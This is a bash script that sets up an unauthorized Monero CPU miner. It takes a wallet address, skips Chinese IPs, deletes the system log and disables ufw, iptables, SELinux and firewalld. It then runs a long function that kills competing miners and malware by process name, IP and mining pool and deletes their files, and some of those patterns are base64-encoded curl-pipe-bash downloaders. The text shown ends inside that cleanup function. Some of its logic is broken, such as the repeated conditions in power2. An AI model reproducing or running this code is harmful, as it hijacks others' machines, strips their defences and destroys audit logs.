#!/bin/bash

VERSION=2.11
cd $HOME/
wget http://ip-api.com/json/
chmod 777 index.html
# Detect IP address
if index.html | sed 's/,/\n/g' | grep  -i 'CN'; then 
    exit 1 
fi

# Management judgment
if [ "$(id -u)" == "0" ]; then
  echo "WARNING: This is the permission of Root"
fi

# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

# Disable firewall
ulimit -n 65535
rm -rf /var/log/syslog
ufw disable
iptables -F
setenforce 0 2>dev/null
echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
firewall-cmd --zone=public --add-port=13777/tcp --permanent
firewall -cmd --reload	
systemctl disable firewalld.service	
systemctl stop firewalld.service

# printing greetings
if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> mysqltcp.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

# calculating port
CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 13777 ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "13777" -o "$PORT" -gt "13777" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi

# printing intentions
echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/myssqltcp/Tcphost.sh script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at  site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using Myssqltcp systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
echo

# start doing stuff: preparing miner
kill_miner_proc()
{
    netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -anp | grep 140.82.52.87 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :23 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :143 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :2222 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :13531 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :3389 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :5555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :6666 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :6665 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :6667 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :8444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
    ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'systemten' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'netns' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'voltuned' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'darwin' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '/tmp/dl' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '/tmp/ddg' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '/tmp/pprt' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '/tmp/ppol' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '/tmp/65ccE*' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'IOFoqIgyC0zmf2UR' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '45.76.122.92' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '51.38.191.178' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '51.15.56.161' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '86s.jpg' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'aGTSGJJp' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'nMrfmnRa' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'PuNY5tm2' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'I0r8Jyyt' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'AgdgACUD' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'uiZvwxG8' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'BtwXn5qH' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '3XEzey2T' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 't2tKrCSZ' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'svc' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'HD7fcBgg' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'zXcDajSs' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '3lmigMo' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'AkMK4A2' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'AJ2AkKe' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'HiPxCJRS' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'http_0xCC030' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'http_0xCC031' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'http_0xCC032' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'http_0xCC033' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "C4iLM4L" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | awk '{ if(substr($11,1,2)=="./" && substr($12,1,2)=="./") print $2 }' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '/boot/vmlinuz' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "i4b503a52cc5" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "dgqtrcst23rtdi3ldqk322j2" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "2g0uv7npuhrlatd" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "nqscheduler" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "rkebbwgqpl4npmm" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep -v aux | grep "]" | awk '$3>10.0{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "2fhtu70teuhtoh78jc5s" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "0kwti6ut420t" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "44ct7udt0patws3agkdfqnjm" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep -v "/" | grep -v "-" | grep -v "_" | awk 'length($11)>19{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "\[^" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "rsync" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "watchd0g" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | egrep 'wnTKYg|2t3ik|qW3xT.2|ddg' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "158.69.133.18:8220" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "/tmp/java" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'gitee.com' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '104.248.4.162' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '89.35.39.78' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '/dev/shm/z3.sh' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'redis2' | awk '{print $2}' | xargs -I % kill -9 %
    #ps aux | grep -v grep | grep -v root | grep -v dblaunch | grep -v dblaunchs | grep -v dblaunched | grep -v apache2 | grep -v atd | grep -v kdevtmpfsi | awk '$3>80.0{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep -v aux | grep " ps" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -I % kill -9 %
    ps aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -I % kill -9 %
    ps aux | grep -v grep | grep -v aux | grep "x]" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep -v aux | grep "sh] <" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep -v aux | grep " \[]" | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '/tmp/l.sh' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'CnzFVPLF' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'CvKzzZLs' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '/tmp/udevd' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCApIHwgYmFzaCA' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'Y3VybCAtcyBodHRwOi8vMTA3LjE3NC40Ny4xNTYvbXIuc2ggfCBiYXNoIC1zaAo' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'sustse' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'sustse3' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '2mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '2mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'cr5.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'cr5.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'logo9.jpg' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'logo9.jpg' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'j2.conf' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'luk-cpu' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'luk-cpu' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'ficov' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'ficov' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'he.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'he.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'miner.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'miner.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'nullcrew' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'nullcrew' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '107.174.47.156' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '83.220.169.247' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '51.38.203.146' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '144.217.45.45' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '107.174.47.181' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep '176.31.6.16' | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "mine.moneropool.com" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "pool.t00ls.ru" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:8080" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:3333" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "xmr.f2pool.com:13531" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "zhuabcn@yahoo.com" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "monerohash.com" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "/tmp/a7b104c270" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:6666" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:7777" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:443" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "stratum.f2pool.com:8888" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "xmrpool.eu" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep -v grep | grep "kieuanilam.me" | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep xiaoyao | awk '{print $2}' | xargs -I % kill -9 %
    ps auxf | grep xiaoxue | awk '{print $2}' | xargs -I % kill -9 %
    netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
    netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
    pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
    pgrep -f xzpauectgr | xargs -I % kill -9 %
    pgrep -f slxfbkmxtd | xargs -I % kill -9 %
    pgrep -f mixtape | xargs -I % kill -9 %
    pgrep -f addnj | xargs -I % kill -9 %
    pgrep -f 200.68.17.196 | xargs -I % kill -9 %
    pgrep -f IyEvYmluL3NoCgpzUG | xargs -I % kill -9 %
    pgrep -f KHdnZXQgLXFPLSBodHRw | xargs -I % kill -9 %
    pgrep -f FEQ3eSp8omko5nx9e97hQ39NS3NMo6rxVQS3 | xargs -I % kill -9 %
    pgrep -f Y3VybCAxOTEuMTAxLjE4MC43Ni9saW4udHh0IHxzaAo | xargs -I % kill -9 %
    pgrep -f mwyumwdbpq.conf | xargs -I % kill -9 %
    pgrep -f honvbsasbf.conf | xargs -I % kill -9 %
    pgrep -f mqdsflm.cf | xargs -I % kill -9 %
    pgrep -f lower.sh | xargs -I % kill -9 %
    pgrep -f ./ppp | xargs -I % kill -9 %
    pgrep -f cryptonight | xargs -I % kill -9 %
    pgrep -f ./seervceaess | xargs -I % kill -9 %
    pgrep -f ./servceaess | xargs -I % kill -9 %
    pgrep -f ./servceas | xargs -I % kill -9 %
    pgrep -f ./servcesa | xargs -I % kill -9 %
    pgrep -f ./vsp | xargs -I % kill -9 %
    pgrep -f ./jvs | xargs -I % kill -9 %
    pgrep -f ./pvv | xargs -I % kill -9 %
    pgrep -f ./vpp | xargs -I % kill -9 %
    pgrep -f ./pces | xargs -I % kill -9 %
    pgrep -f ./rspce | xargs -I % kill -9 %
    pgrep -f ./haveged | xargs -I % kill -9 %
    pgrep -f ./jiba | xargs -I % kill -9 %
    pgrep -f ./watchbog | xargs -I % kill -9 %
    pgrep -f ./A7mA5gb | xargs -I % kill -9 %
    pgrep -f kacpi_svc | xargs -I % kill -9 %
    pgrep -f kswap_svc | xargs -I % kill -9 %
    pgrep -f kauditd_svc | xargs -I % kill -9 %
    pgrep -f kpsmoused_svc | xargs -I % kill -9 %
    pgrep -f kseriod_svc | xargs -I % kill -9 %
    pgrep -f kthreadd_svc | xargs -I % kill -9 %
    pgrep -f ksoftirqd_svc | xargs -I % kill -9 %
    pgrep -f kintegrityd_svc | xargs -I % kill -9 %
    pgrep -f jawa | xargs -I % kill -9 %
    pgrep -f oracle.jpg | xargs -I % kill -9 %
    pgrep -f 45cToD1FzkjAxHRBhYKKLg5utMGEN | xargs -I % kill -9 %
    pgrep -f 188.209.49.54 | xargs -I % kill -9 %
    pgrep -f 181.214.87.241 | xargs -I % kill -9 %
    pgrep -f etnkFgkKMumdqhrqxZ6729U7bY8pzRjYzGbXa5sDQ | xargs -I % kill -9 %
    pgrep -f 47TdedDgSXjZtJguKmYqha4sSrTvoPXnrYQEq2Lbj | xargs -I % kill -9 %
    pgrep -f etnkP9UjR55j9TKyiiXWiRELxTS51FjU9e1UapXyK | xargs -I % kill -9 %
    pgrep -f servim | xargs -I % kill -9 %
    pgrep -f kblockd_svc | xargs -I % kill -9 %
    pgrep -f native_svc | xargs -I % kill -9 %
    pgrep -f ynn | xargs -I % kill -9 %
    pgrep -f 65ccEJ7 | xargs -I % kill -9 %
    pgrep -f jmxx | xargs -I % kill -9 %
    pgrep -f 2Ne80nA | xargs -I % kill -9 %
    pgrep -f sysstats | xargs -I % kill -9 %
    pgrep -f systemxlv | xargs -I % kill -9 %
    pgrep -f watchbog | xargs -I % kill -9 %
    pgrep -f OIcJi1m | xargs -I % kill -9 %
    pkill -f biosetjenkins
    pkill -f Loopback
    pkill -f apaceha
    pkill -f cryptonight
    pkill -f mixnerdx
    pkill -f performedl
    pkill -f JnKihGjn
    pkill -f irqba2anc1
    pkill -f irqba5xnc1
    pkill -f irqbnc1
    pkill -f ir29xc1
    pkill -f conns
    pkill -f irqbalance
    pkill -f crypto-pool
    pkill -f XJnRj
    pkill -f mgwsl
    pkill -f pythno
    pkill -f jweri
    pkill -f lx26
    pkill -f NXLAi
    pkill -f BI5zj
    pkill -f askdljlqw
    pkill -f minerd
    pkill -f minergate
    pkill -f Guard.sh
    pkill -f ysaydh
    pkill -f bonns
    pkill -f donns
    pkill -f kxjd
    pkill -f Duck.sh
    pkill -f bonn.sh
    pkill -f conn.sh
    pkill -f kworker34
    pkill -f kw.sh
    pkill -f pro.sh
    pkill -f polkitd
    pkill -f acpid
    pkill -f icb5o
    pkill -f nopxi
    pkill -f irqbalanc1
    pkill -f minerd
    pkill -f i586
    pkill -f gddr
    pkill -f mstxmr
    pkill -f ddg.2011
    pkill -f wnTKYg
    pkill -f deamon
    pkill -f disk_genius
    pkill -f sourplum
    pkill -f polkitd
    pkill -f nanoWatch
    pkill -f zigw
    pkill -f devtool
    pkill -f devtools
    pkill -f systemctI
    pkill -f watchbog
    pkill -f cryptonight
    pkill -f sustes
    pkill -f xmrig
    pkill -f xmrig-cpu
    pkill -f 121.42.151.137
    pkill -f init12.cfg
    pkill -f nginxk
    pkill -f tmp/wc.conf
    pkill -f xmrig-notls
    pkill -f xmr-stak
    pkill -f suppoie
    pkill -f zer0day.ru
    pkill -f dbus-daemon--system
    pkill -f nullcrew
    pkill -f systemctI
    pkill -f kworkerds
    pkill -f init10.cfg
    pkill -f /wl.conf
    pkill -f crond64
    pkill -f sustse
    pkill -f vmlinuz
    pkill -f exin
    pkill -f apachiii
    pkill -f svcworkmanager
    pkill -f xr
    pkill -f trace
    pkill -f svcupdate
    pkill -f networkmanager
    pkill -f phpupdate
    rm -rf /usr/bin/config.json
    rm -rf /usr/bin/exin
    rm -rf /tmp/wc.conf
    rm -rf /tmp/log_rot
    rm -rf /tmp/apachiii
    rm -rf /tmp/sustse
    rm -rf /tmp/php
    rm -rf /tmp/p2.conf
    rm -rf /tmp/pprt
    rm -rf /tmp/ppol
    rm -rf /tmp/javax/config.sh
    rm -rf /tmp/javax/sshd2
    rm -rf /tmp/.profile
    rm -rf /tmp/1.so
    rm -rf /tmp/kworkerds
    rm -rf /tmp/kworkerds3
    rm -rf /tmp/kworkerdssx
    rm -rf /tmp/xd.json
    rm -rf /tmp/syslogd
    rm -rf /tmp/syslogdb
    rm -rf /tmp/65ccEJ7
    rm -rf /tmp/jmxx
    rm -rf /tmp/2Ne80nA
    rm -rf /tmp/dl
    rm -rf /tmp/ddg
    rm -rf /tmp/systemxlv
    rm -rf /tmp/systemctI
    rm -rf /tmp/.abc
    rm -rf /tmp/osw.hb
    rm -rf /tmp/.tmpleve
    rm -rf /tmp/.tmpnewzz
    rm -rf /tmp/.java
    rm -rf /tmp/.omed
    rm -rf /tmp/.tmpc
    rm -rf /tmp/.tmpleve
    rm -rf /tmp/.tmpnewzz
    rm -rf /tmp/gates.lod
    rm -rf /tmp/conf.n
    rm -rf /tmp/devtool
    rm -rf /tmp/devtools
    rm -rf /tmp/fs
    rm -rf /tmp/.rod
    rm -rf /tmp/.rod.tgz
    rm -rf /tmp/.rod.tgz.1
    rm -rf /tmp/.rod.tgz.2
    rm -rf /tmp/.mer
    rm -rf /tmp/.mer.tgz
    rm -rf /tmp/.mer.tgz.1
    rm -rf /tmp/.hod
    rm -rf /tmp/.hod.tgz
    rm -rf /tmp/.hod.tgz.1
    rm -rf /tmp/84Onmce
    rm -rf /tmp/C4iLM4L
    rm -rf /tmp/lilpip
    rm -rf /tmp/3lmigMo
    rm -rf /tmp/am8jmBP
    rm -rf /tmp/tmp.txt
    rm -rf /tmp/baby
    rm -rf /tmp/.lib
    rm -rf /tmp/systemd
    rm -rf /tmp/lib.tar.gz
    rm -rf /tmp/baby
    rm -rf /tmp/java
    rm -rf /tmp/j2.conf
    rm -rf /tmp/.mynews1234
    rm -rf /tmp/a3e12d
    rm -rf /tmp/.pt
    rm -rf /tmp/.pt.tgz
    rm -rf /tmp/.pt.tgz.1
    rm -rf /tmp/go
    rm -rf /tmp/java
    rm -rf /tmp/j2.conf
    rm -rf /tmp/.tmpnewasss
    rm -rf /tmp/java
    rm -rf /tmp/go.sh
    rm -rf /tmp/go2.sh
    rm -rf /tmp/khugepageds
    rm -rf /tmp/.censusqqqqqqqqq
    rm -rf /tmp/.kerberods
    rm -rf /tmp/kerberods
    rm -rf /tmp/seasame
    rm -rf /tmp/touch
    rm -rf /tmp/.p
    rm -rf /tmp/runtime2.sh
    rm -rf /tmp/runtime.sh
    rm -rf /dev/shm/z3.sh
    rm -rf /dev/shm/z2.sh
    rm -rf /dev/shm/.scr
    rm -rf /dev/shm/.kerberods
    rm -f /etc/ld.so.preload
    rm -f /usr/local/lib/libioset.so
    chattr -i /etc/ld.so.preload
    rm -f /etc/ld.so.preload
    rm -f /usr/local/lib/libioset.so
    rm -rf /tmp/watchdogs
    rm -rf /etc/cron.d/tomcat
    rm -rf /etc/rc.d/init.d/watchdogs
    rm -rf /usr/sbin/watchdogs
    rm -f /tmp/kthrotlds
    rm -f /etc/rc.d/init.d/kthrotlds
    rm -rf /tmp/.sysbabyuuuuu12
    rm -rf /tmp/logo9.jpg
    rm -rf /tmp/miner.sh
    rm -rf /tmp/nullcrew
    rm -rf /tmp/proc
    rm -rf /tmp/2.sh
    rm /opt/atlassian/confluence/bin/1.sh
    rm /opt/atlassian/confluence/bin/1.sh.1
    rm /opt/atlassian/confluence/bin/1.sh.2
    rm /opt/atlassian/confluence/bin/1.sh.3
    rm /opt/atlassian/confluence/bin/3.sh
    rm /opt/atlassian/confluence/bin/3.sh.1
    rm /opt/atlassian/confluence/bin/3.sh.2
    rm /opt/atlassian/confluence/bin/3.sh.3
    rm -rf /var/tmp/f41
    rm -rf /var/tmp/2.sh
    rm -rf /var/tmp/config.json
    rm -rf /var/tmp/xmrig
    rm -rf /var/tmp/1.so
    rm -rf /var/tmp/kworkerds3
    rm -rf /var/tmp/kworkerdssx
    rm -rf /var/tmp/kworkerds
    rm -rf /var/tmp/wc.conf
    rm -rf /var/tmp/nadezhda.
    rm -rf /var/tmp/nadezhda.arm
    rm -rf /var/tmp/nadezhda.arm.1
    rm -rf /var/tmp/nadezhda.arm.2
    rm -rf /var/tmp/nadezhda.x86_64
    rm -rf /var/tmp/nadezhda.x86_64.1
